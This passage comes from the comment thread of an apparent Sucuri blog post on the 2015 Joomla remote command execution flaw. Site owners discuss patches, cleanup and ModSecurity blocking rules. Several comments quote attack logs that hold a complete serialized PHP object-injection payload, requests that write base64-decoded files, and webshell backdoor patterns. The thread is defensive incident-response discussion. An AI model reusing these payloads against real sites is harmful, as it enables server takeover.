     109.201.143.40
     109.201.152.13
     142.4.213.25
     142.54.171.124
     146.90.84.210
     149.126.76.97
     149.202.42.188
     149.202.98.160
     149.202.98.161
     149.210.233.129
     151.80.138.19
     151.80.175.238
     151.80.37.117
     158.69.172.227
     158.69.192.220
     158.69.214.254
     158.69.215.68
     158.69.215.7
     162.221.200.51
     162.247.72.202
     162.247.72.212
     162.247.72.27
     167.114.204.255
     167.114.89.196
     171.25.193.131
     171.25.193.132
     171.25.193.25
     173.255.229.8
     176.10.104.240
     176.10.104.243
     176.56.230.162
     178.162.216.42
     178.254.18.100
     178.32.53.53
     185.100.85.61
     185.101.107.189
     185.104.120.2
     185.17.184.228
     185.65.135.227
     188.27.107.37
     188.68.229.144
     192.42.116.16
     193.107.85.62
     193.171.202.150
     193.90.12.86
     194.150.168.79
     194.150.168.95
     194.28.174.106
     194.28.174.117
     195.154.56.44
     195.154.69.88
     195.19.194.108
     195.22.126.119
     198.50.145.72
     198.51.75.165
     204.194.29.4
     204.85.191.30
     212.117.180.21
     212.21.66.6
     212.47.238.193
     212.47.246.21
     213.126.78.59
     213.61.149.100
     217.115.10.133

    good luck to all
22. ![](https://secure.gravatar.com/avatar/419da74a42ba3c1bca39a008db8b0e4b?s=60&d=mm&r=g) **Mike** says: [December 15, 2015 at 7:17 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7107)

    Do you have any modsecurity rule for blocking session.php 0day exploit?
23. ![](https://secure.gravatar.com/avatar/e2ffe24ed660754686b36f15451842f4?s=60&d=mm&r=g) **[Eric Nelson](http://www.slickrockweb.com)** says: [December 16, 2015 at 3:19 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7112)

    Daniel any idea on how long you think this exploit has been known? The exploit itself seems reasonably clever but the execution and final payload, at least what has been happening for the past few days, seems somewhat clunky and amateurish. It is as if the exploit was known by someone else and maybe sold to spammers. I have not seen many pre-existing rules or filters that would have caught at least the initial exploit. The second step of posting the payload seems to be where much of this got stopped. That is where our WAFs stopped it for our clients and I am sure the same was true for Sucuri clients … and maybe you guys caught it at the User Agent step. But I fear this one will be felt for a while across the internet …. because we all know only a small percentage of sites have been patched in the last 24 hrs. And my gut is telling me that the person or group who figured out this exploit is not the same people doing this wave of attacks that presumably started a few days ago.

    1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 16, 2015 at 3:56 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7126)

       The first traces of the attack started 2 days before the disclosure. We could not find any more attempts going back a while in our logs. And yes, we were able to block it due to our pre-existing rules to filter the user-agent and x-forwarded-for headers.

       As far as the scope, I am seeing a lot of sites hacked already and still a LOT of unpatched sites out there.

       thanks,
24. ![](https://secure.gravatar.com/avatar/471b09c53c17cba8c6f9768ac4ef59cd?s=60&d=mm&r=g) **anamaria1980** says: [December 16, 2015 at 11:51 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7115)

    On one of my sites I have hacked some core files to disable writing session info in sessions table, except for sessions of the administrator side of joomla. Would that accidentally protect me from this attack?

    1. ![](https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=60&d=mm&r=g) **Phil Taylor, The Joomla Expert** says: [December 16, 2015 at 4:02 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7132)

       The session data has to be stored somewhere – so no – that would not protect you.
25. ![](https://secure.gravatar.com/avatar/522c0b6796533143ca0bdf93b0834391?s=60&d=mm&r=g) **ronald** says: [December 16, 2015 at 2:18 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7116)

    Is joomla not working correct anymore do we have to switch to wordpress?
26. ![](https://secure.gravatar.com/avatar/522c0b6796533143ca0bdf93b0834391?s=60&d=mm&r=g) **ronald** says: [December 16, 2015 at 2:21 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7117)

    Our hosting company doesn’t accept joomla because of the Security issues. Is this justified?
     Is joomla not working correct anymore do we have to switch to wordpress?

    1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 16, 2015 at 3:52 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7125)

       Not at all. Every CMS will have security vulnerabilities and as long as you keep it patched and follow good security practices, you will be ok.

       Remember, every code has vulnerabilities. The security of your site should not be dependent on having a flawless code. That’s why we preach security/defense in depth and taking extra security measures so 1 failure doesn’t equal to full compromise.

       thanks!
    2. ![](https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=60&d=mm&r=g) **Phil Taylor** says: [December 16, 2015 at 3:57 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7128)

       Care to name your incompetent foolish web host?

       1. ![](https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=60&d=mm&r=g) **[Tony Perez](http://perezbox.com/)** says: [December 16, 2015 at 8:26 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7149)

          Hey @prazgod:disqus

          There isn’t a need for these types of responses. There are ways to be more tactful in your engagement.

          Tony

          1. ![](https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=60&d=mm&r=g) **Phil Taylor, The Joomla Expert** says: [December 16, 2015 at 8:30 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7152)

             Whatever. A webhost refusing to host joomla on security grounds is incompetent and foolish. If you dont care for my honest engagement then block me from your site – I honestly could not care less. There is so much disinformation in the comments in your posts anyway – and more to this vulnerability that you dont know and will come to light this week… much… much more…
    3. ![](https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=60&d=mm&r=g) **Alan Langford** says: [December 16, 2015 at 4:22 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7135)

       WordPress has had multiple security issues as well. A good host needs to implement defenses against vulnerabilities in anything that involves code, be that PHP, Python, Ruby, Java or anything else. If your host thinks that banning Joomla is going to solve their security issues, then they’re delusional.
27. ![](https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=60&d=mm&r=g) **Dukes909** says: [December 16, 2015 at 2:38 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7118)

    I already patched my site but reading through the comments here and then going through my install I’ve found files modified: includes/defines.php has this:

    if(strpos(implode($\_SERVER),”O:”)){exit;}

    which is easy enough to fix but how do I find all the other files (if any, and I presume there are) that have been modified. BTW, this file had a timestamp of Sept. 8, 2015.
28. ![](https://secure.gravatar.com/avatar/3b0a5563f0cc4d0c2a4a6f532388c97b?s=60&d=mm&r=g) **Pat** says: [December 16, 2015 at 3:31 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7120)

    The patches for 1.5.x and 2.5.x do not fix the issue, they leave the vaunerability accessable via HTTP\_X\_FORWARDED\_FOR

    The 3.x patch that went in, also correct this other entry point.

    1. ![](https://secure.gravatar.com/avatar/e2ffe24ed660754686b36f15451842f4?s=60&d=mm&r=g) **[Eric Nelson](http://www.slickrockweb.com)** says: [December 16, 2015 at 4:04 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7133)

       Not sure which patch you ended up getting. I saw two different ones, but the one that has this line below in it and the one we used should protect 1.5.x and 2.5.x going forward.

       if(!empty($xForwardedFor) && filter\_var($xForwardedFor, FILTER\_VALIDATE\_IP) !== false)

       Adds a sanitizing routine for the HTTP\_X\_FORWARDED\_FOR variable and a similar line does the REMOTE\_ADDR variable. The user agent is just completely removed from the session data.
    2. ![](https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=60&d=mm&r=g) **Phil Taylor, The Joomla Expert** says: [December 16, 2015 at 4:05 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7134)

       Seems my other comment is being held for moderation – so I’ll give you a 4 word summary here – you are factually wrong!
29. ![](https://secure.gravatar.com/avatar/eb1cc0771b941eb42a0a3c66a9250b1f?s=60&d=mm&r=g) **Philippe** says: [December 16, 2015 at 3:33 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7121)

    Hi,

    I test a modsecurity rules which has stopped the attack.
     Put your own rules in your modsecurity configuration file , typically “/etc/httpd/modsecurity.d/activated\_rules/modsecurity\_crs\_10\_lab.conf” :
     SecRule REQUEST\_URI|ARGS|REQUEST\_HEADERS “test|O:21:”JDatabaseDriverMysqli”” “id:99992,severity:4,msg:’Access Denied'”
     SecRule REQUEST\_URI|ARGS|REQUEST\_HEADERS “eval(base64\_decode($\_POST[111]” “id:99991,severity:4,msg:’Access Denied'”
     SecRule REQUEST\_URI|ARGS|REQUEST\_HEADERS “feed\_url” “id:99990,severity:4,msg:’Access Denied'”

    The first rule should be enough to stop the attack

    In modsec\_audit.log : the access is denied

    –aed86a72-H–
     Message: Access denied with code 403 (phase 2). Pattern match “test|O:21:”JDatabaseDriverMysqli”” at REQUEST\_HEADERS:User-Agent. [file “/etc/httpd/modsecurity.d/activated\_rules/modsecurity\_crs\_10\_lab.conf”] [line “38”] [id “99992”] [msg “Access Denied”] [severity “WARNING”]
30. ![](https://secure.gravatar.com/avatar/47b09b0c5953036e109f9c0ccba85ba3?s=60&d=mm&r=g) **victim** says: [December 16, 2015 at 5:01 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7141)

    I’d like to share my findings about what modifications to your system you should expect. After JDatabaseDriverMysqli requests, there was suspicious mail server activity. Deferred mails contained the header X-PHP-Originating-Script: 33:include.php(1960), infected php files (a few spread across system, some new, some modified, no particluar size or timestamp or name) contained either
     eval (base64\_decode($\_POST[“php”]) or
     $GLOBALS[‘some\_binary\_data\_starting\_with\_small\_letters’],
     the latter often starting in row ~519 of line 1 of a php so you only see it with line wrapping enabled…

    1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 16, 2015 at 8:26 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7150)

       Thanks for sharing. Hope that is useful to anyone else trying to clean their site.
31. ![](https://secure.gravatar.com/avatar/1c51bec7f8639e6f8a508fbc97e0a5da?s=60&d=mm&r=g) **Der Koch** says: [December 17, 2015 at 2:32 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7154)

    I see comments of people moaning that you guys posted this info; but for me, all I can say is THANK YOU, tnx tnx, a lot. My sites started receiving this crap, and for the info posted by you guys I was able to detect how much the attackers did (so far nothing), and how to avoid it in the future, aside of the piece of news so we all got aware.

    Also, on a side note… I have daily backups, and cannot find a single changed file (not by me) for the websites, something inside tells me there has to be something else. From my logs I do see first the \_POST[111], but no ‘HTTP\_CMD’ before it, multiple times. Also, the crap they send comes in HTTP\_X\_FORWARDED\_FOR and HTTP\_USER\_AGENT

    I also see a few “tests” like “print md5(123123123);JFactory::getConfig();exit;” where it seems they are verifying the payload ran, but the md5 argument is always the same.
32. ![](https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=60&d=mm&r=g) **[Jan R](https://www.saotn.org)** says: [December 17, 2015 at 5:50 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7161)

    Hi Xristoph,

    Of course, the post contains real live bits of malware, no wonder your anti malware program goes nuts… However, it’s only plain text and no scripts, so you don’t have to worry 🙂
33. ![](https://secure.gravatar.com/avatar/e5d80b99f4675042f9f5b11917215f0b?s=60&d=mm&r=g) **Suzanne** says: [December 18, 2015 at 5:21 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7163)

    Just a question on this. Does the update over a hacked site fix it or do we also need to go through other exercises? are only php files hacked or does this affect the database as well? Uh, maybe this is the same question as the one below 🙂 Thank you

    1. ![](https://secure.gravatar.com/avatar/f2b75227953aa513ef7f7c9d05fba8df?s=60&d=mm&r=g) **[Alan Henness](http://www.nightingale-collaboration.org/)** says: [December 18, 2015 at 10:44 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7165)

       As I understand it, the update would stop any future attempts to exploit the site but if your site (like two of mine) was targeted before the update, then just about anything could have been done to your site. So I think we’re left with no option but to look for new and changed files. I’ve not found an easy way to do this so it looks like it’s going to take a long time.

       I have Akeeba’s Admin Tools installed and this generally protects against a lot of attacks. However, it didn’t at the time protect against this one (the last update a few days ago does). One of the features is a way to compare files to see if they have changed. Unfortunately, I had never run that on my sites, so I had nothing to compare to! But I think that would have made life very easy in terms of finding new and changed files!

       I think my only option is to download a recent backup (I use <http://www.myrepono,com>) from before the exploits started a week or so ago and compare that to the current site (which has the update, so some files will have changed anyway). I know this needs to be done, but I have some deadlines approaching fast!

       I don’t know if it will stop anything, but changing your database user’s password must be a minimum – I’ve changed the user and password – and as long as any backdoor doesn’t allow the hackers to re-access your configuration.php file, that should at least stop them accessing your database – I think…

       Another simple thing to do is to check that no new joomla users have been created – one with superuser rights is obviously dangerous! Also check for new database users.

       If anyone here knows better, please feel free to correct anything I’ve said! I’m not an expert.
34. ![](https://secure.gravatar.com/avatar/ba2cff4c56e646dd0185f19e53e398d7?s=60&d=mm&r=g) **Martin** says: [December 18, 2015 at 9:33 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7164)

    Hello,
     I would like to ask if in this case will help SSL certificate for administration? I´m not expert.

    Thank you very much

    1. ![](https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=60&d=mm&r=g) **Phil Taylor, The Joomla Expert** says: [December 18, 2015 at 1:26 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7166)

       No – a SSL Certificate will not protect you from this issue at all.
35. ![](https://secure.gravatar.com/avatar/90ab348c44b2f5b25ff97d54e1a21764?s=60&d=mm&r=g) **Thomas** says: [December 18, 2015 at 4:38 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7167)

    Correct me if I am wrong but it appears that this is not a Joomla vulnerability but rather a PHP vulnerability.

    That only webservers that are using older versions of PHP are vulnerable to this exploit regardless of if Joomla was patched quick enough or not. PHP was patched in September, so any server that updated PHP after that should be protected against this vulnerability. PHP versions below 5.5.29, 5.6.13 and below 5.5 are the ones that are vulnerable.

    Joomla released a patch that prevents older versions of PHP from being exploited through Joomla. I am a bit new to this stuff, so check and confirm what I am saying. I think it would also be important to note that despite patching Joomla if you are using an older version of PHP that has the vulnerability. You may wind up being exploited in another way via the same vulnerability in some other way not only via Joomla. So you need to make sure what version of PHP you are using and update it if it is outdated.

    Here is a link to the PHP changelog, showing the fix: <http://php.net/ChangeLog-5.php#5.5.29>

    I see attempts in my server logs to exploit this vulnerability, before the Joomla patch was released, like people mention in these comments. But my PHP version was updated before this so it does not appear that anything happened on the server.

    1. ![](https://secure.gravatar.com/avatar/a746e2ff69aafd175e65682cc3283fa8?s=60&d=mm&r=g) **[Michael Babker](http://www.babdev.com/)** says: [December 18, 2015 at 9:40 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7169)

       It is a Joomla vulnerability in that certain data was allowed to be injected into the session without sanitization. Regardless of PHP version, that was exploitable. The use after free vulnerabilities fixed in PHP releases this year help to mitigate the scope of what can be done with the vulnerabilities, but it would be wrong to assume that users running PHP 5.4.45, 5.5.29+, or 5.6.13+ are fully protected because of the PHP security patches.
    2. ![](https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=60&d=mm&r=g) **Anna Mendez** says: [December 22, 2015 at 1:11 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7175)

       I think you was right that users with old php versions are vulnerable even after patch 3.4.6. But today Joomla just release 3.4.7 version and with this version even users with old php are not vulerable anymore. Is that correct?
36. ![](https://secure.gravatar.com/avatar/a1919d8c618a0bf23d8f8a442fb9cb3a?s=60&d=mm&r=g) **[Marcelo Pedra](http://www.marcelopedra.com.ar/blog/)** says: [December 18, 2015 at 8:16 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7168)

    Hello people. Any report on this affecting sites using Joomla 1.0? Yes, I have a couple ones in an old server and I’ve found the keyword “JDatabaseDriverMysqli” within the logs. Am I vulnerable or only those with 1.5+ are?
37. ![](https://secure.gravatar.com/avatar/dcdcaff56953852209c18914c45f611b?s=60&d=mm&r=g) **[Wasim Ismail](http://www.wasimismail.com)** says: [December 19, 2015 at 1:36 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7170)

    HI I have just downloaded my site on to my localhost on my PC After it got attacked :S.
     Im tring to login to the admin, and the page does not move foward, even after changing password from myphpadmin. Is that part of this attack?
38. ![](https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=60&d=mm&r=g) **Anna Mendez** says: [December 21, 2015 at 2:17 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7173)

    If a joomla website is attacked, other joomla webistes (not yet attacked and yet upgraded with last hotfixes) on same server are vulnerable?
39. ![](https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=60&d=mm&r=g) **Anna Mendez** says: [December 22, 2015 at 1:12 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7176)

    Joomla 3.4.7 just release (and equivalent hotfix for J1.5 and J2.5). It seems that users with old php versions (before 5.4.45, 5.5.29, 5.6.13) are vulnerable even after patch 3.4.6. But today Joomla just release 3.4.7 version and with this version even users with old php are not vulerable anymore. Is that correct?
40. ![](https://secure.gravatar.com/avatar/8b5d94f9560dddbe5bb2c683debc23e6?s=60&d=mm&r=g) **Nicolas Dadou** says: [December 31, 2015 at 3:25 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7194)

    Hi is there a manner to know what they made with the log?
     here is the logs from my website.

    95.110.187.117 website – [31/Dec/2015:00:34:53 +0100] “GET /administrator/?1=%40ini\_set%28%22display\_errors%22%2C%220%22%29%3B%40set\_time\_limit%280%29%3B%40set\_magic\_quotes\_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile\_put\_contents%28%24\_SERVER%5B%27DOCUMENT\_ROOT%27%5D.%27/administrator/dbconfig.php%27%2Cbase64\_decode%28%”code I don’t provide for security ( I don’t know what is it)” HTTP/1.1″ 200 9187 “-” “}\_\_test|O:21:”JDatabaseDriverMysqli”:3:{s:2:”fc”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:8:”feed\_url”;s:46:”eval($\_REQUEST[1]);JFactory::getConfig();exit;”;s:19:”cache\_name\_function”;s:6:”assert”;s:5:”cache”;b:1;s:11:”cache\_class”;O:20:”JDatabaseDriverMysql”:0:{}}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;b:1;}xf0x9dx8cx86″
     95.110.187.117 website – [31/Dec/2015:00:34:53 +0100] “GET /administrator/?1=%40ini\_set%28%22display\_errors%22%2C%220%22%29%3B%40set\_time\_limit%280%29%3B%40set\_magic\_quotes\_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile\_put\_contents%28%24\_SERVER%5B%27DOCUMENT\_ROOT%27%5D.%27/administrator/dbconfig.php%27%2Cbase64\_decode%28%”code I don’t provide for security ( I don’t know what is it)” HTTP/1.1″ 200 9187 “-” “Python-urllib/2.7”
     95.110.187.117 website – [31/Dec/2015:00:34:54 +0100] “GET /?1=%40ini\_set%28%22display\_errors%22%2C%220%22%29%3B%40set\_time\_limit%280%29%3B%40set\_magic\_quotes\_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile\_put\_contents%28%24\_SERVER%5B%27DOCUMENT\_ROOT%27%5D.%27/administrator/dbconfig.php%27%2Cbase64\_decode%28%”code I don’t provide for security ( I don’t know what is it)” HTTP/1.1″ 200 68918 “-” “}\_\_test|O:21:”JDatabaseDriverMysqli”:3:{s:2:”fc”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:8:”feed\_url”;s:46:”eval($\_REQUEST[1]);JFactory::getConfig();exit;”;s:19:”cache\_name\_function”;s:6:”assert”;s:5:”cache”;b:1;s:11:”cache\_class”;O:20:”JDatabaseDriverMysql”:0:{}}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;b:1;}xf0x9dx8cx86″
     I don’t find any file updated in the [http://FTP…](http://FTP...).
41. ![](https://secure.gravatar.com/avatar/ff1dd596ceb9fb0ff5a2b137d047a797?s=60&d=mm&r=g) **Martin Lines** says: [January 1, 2016 at 12:34 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7198)

    My site was originally compromised on the zero day. Following a lot of effort we thought we had cleaned it up. Joomla was updated to 3.4.8 and php is 5.4.45. However it was successfully attacked last night.The only files I can find affect are defines.php in /includes and /administrator/includes.

    In access.log I can see entries such as….

    166.62.102.232 – – [01/Jan/2016:05:05:10 +0000] “GET / HTTP/1.1” 200 2097 “-” “}\_\_test|O:21:”JDatabaseDriverMysqli”:3:{s:2:”fc”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:8:”feed\_url”;s:3822:”eval(base64\_decode(‘JGNoZWNrID0gJF9TRV………entry continues on!!

    I am not skilled enough to know if this was the successful attempt, the “200” is worrying as this was a success. Or perhaps I did not find all the entries previously and am being re-infected via a backdoor they have left themselves.?

    1. ![](https://secure.gravatar.com/avatar/4360d89c79b4cfa79216cee73a69dc25?s=60&d=mm&r=g) **Ken Edwards** says: [January 1, 2016 at 5:15 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7200)

       We are witnessing the same as you across a number of Joomla! 3, 2.5 and 1.5 websites after rolling back to ‘clean’ backups made before 9 Dec 2015.

       All affected sites are using J3.4.7 or latest Security Hot fixes (if J1.5 and 2.5) and PHP is 5.5.30 (before the 0-day Hack it was 5.4).

       Anybody else shed any light? The fresh install of a J3.4.7 CMS and J2.5.28 + Hot Fixes TEST sites we have created are holding up well (no 0 Day hacks) but not the previously live sites which we are monitoring.

       Currently we are faced with rock and hard place:

       rebuild sites on fresh J3.4.7 (now 3.4.8 following bug fix release), or
        expensive clean,

       with neither guaranteeing freedom from future hacks.
42. ![](https://secure.gravatar.com/avatar/6ee9e067e8f436dce02e3c433d793d83?s=60&d=mm&r=g) **Toby Salmon** says: [January 3, 2016 at 10:37 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7205)

    I posted two links on the Joomla forum to reports on the Zero day. (My host had provided them after my site was hacked) The security moderators deleted the links under the premise of

    “removed links expaining how to hack sites.”

    Is there something I’m misunderstanding and does this page explain how to hack sites.

    1. ![](https://secure.gravatar.com/avatar/6ee9e067e8f436dce02e3c433d793d83?s=60&d=mm&r=g) **Toby Salmon** says: [January 8, 2016 at 10:02 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7220)

       Anybody have any thoughts on this?
43. ![](https://secure.gravatar.com/avatar/b0ba356b0377a1f4e4331efa2b42a944?s=60&d=mm&r=g) **Khoa** says: [January 20, 2016 at 2:06 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7240)

    I installed oseSecure on my site several months ago, would this protect me? It scans and blocks sql injections, file uploading and code etc.
44. ![](https://secure.gravatar.com/avatar/6d04e0ba9e1f6697f0d662bf5873e551?s=60&d=mm&r=g) **[Shahidul](http://secupent.com/)** says: [February 15, 2016 at 7:07 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7337)

    Thanks for sharing. Useful.
45. ![](https://secure.gravatar.com/avatar/731cbd9ec91cdfa8edeac834b64a3a48?s=60&d=mm&r=g) **Philipp Lang** says: [February 22, 2016 at 12:57 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7362)

    My site was hacked yesterday – my log:

    … \_\_test|O:21:”JDatabaseDriverMysqli”:3:{s:2:”fc”;O:17:”JSimplepieFactory”:0 …

    I use Joomla 3.4.8, so the bug should have been fixed a few months ago. What’s wrong here?
46. ![](https://secure.gravatar.com/avatar/731cbd9ec91cdfa8edeac834b64a3a48?s=60&d=mm&r=g) **Philipp Lang** says: [February 22, 2016 at 1:25 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7363)

    My site was hacked yesterday, although I have the latest Joomla version. What’s going on here?
47. ![](https://secure.gravatar.com/avatar/5e2f6ead07984e5e1e826bd2ed162df2?s=60&d=mm&r=g) **Gustavo Jaramillo** says: [August 25, 2016 at 10:19 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7844)

    Very good thread. @dcid:disqus I have my site with Joomla 1.5 and we built a software in it. Therefore, we cannot upgrade to the new version because the software won’t work. How can I fix the vulnerability issues (possibly the hotfix) so we can have time to update the software and use it with another CMS.

    Please advice. Thank you very much.

Comments are closed.

##### Related Categories

* [Joomla Security](https://blog.sucuri.net/category/joomla-security)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
##### You May Also Like

 ![WordPress Vulnerability Detail](https://blog.sucuri.net/wp-content/uploads/2019/03/vulnerability-details-wp_blog-390x183.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Dissecting the WordPress 5.2.3 Update](https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html)

* [![](https://secure.gravatar.com/avatar/8612a64e0ed5b9e586b548a984073120?s=20&d=mm&r=g)Marc-Alexandre Montpas](https://blog.sucuri.net/author/marc "View all posts by Marc-Alexandre Montpas")
* September 13, 2019
 Last week, WordPress released version 5.2.3 which was a security and maintenance update, and as such, contained many security fixes. Part of our day to…  [Read the Post](https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html)  ![WordPress Vulnerability & Patch Roundup — May 2024](https://blog.sucuri.net/wp-content/uploads/2024/05/May-2024-390x183.jpg)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WordPress Vulnerability & Patch Roundup May 2024](https://blog.sucuri.net/2024/05/wordpress-vulnerability-patch-roundup-may-2024.html)

* [![](https://blog.sucuri.net/wp-content/uploads/2024/07/avatar_user_112_1721420180-20x20.png)Sucuri Malware Research Team](https://blog.sucuri.net/author/malware-research "View all posts by Sucuri Malware Research Team")
* May 28, 2024
 Vulnerability reports and responsible disclosures are essential for website security awareness and education. Automated attacks targeting known software vulnerabilities are one of the leading causes…  [Read the Post](https://blog.sucuri.net/2024/05/wordpress-vulnerability-patch-roundup-may-2024.html)  ![WordPress Vulnerability Detail](https://blog.sucuri.net/wp-content/uploads/2019/03/vulnerability-details-wp_blog-390x183.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Insufficient Privilege Validation in WooCommerce Checkout Manager](https://blog.sucuri.net/2019/04/insufficient-privilege-validation-in-woocommerce-checkout-manager.html)

* [![](https://secure.gravatar.com/avatar/14e8a81f8c7c18715d660025d52ce68a?s=20&d=mm&r=g)John Castro](https://blog.sucuri.net/author/john "View all posts by John Castro")
* April 29, 2019
 Due to the poor handling of a vulnerability disclosure, a new attack vector has appeared for the WooCommerce Checkout Manager WordPress plugin and is affecting…  [Read the Post](https://blog.sucuri.net/2019/04/insufficient-privilege-validation-in-woocommerce-checkout-manager.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Joomla Security](https://blog.sucuri.net/category/joomla-security)
* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)

## [Fake Parameters Conceal a Backdoor](https://blog.sucuri.net/2019/02/fake-parameters-conceal-a-backdoor.html)

* [![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=20&d=mm&r=g)Denis Sinegubko](https://blog.sucuri.net/author/denis "View all posts by Denis Sinegubko")
* February 5, 2019
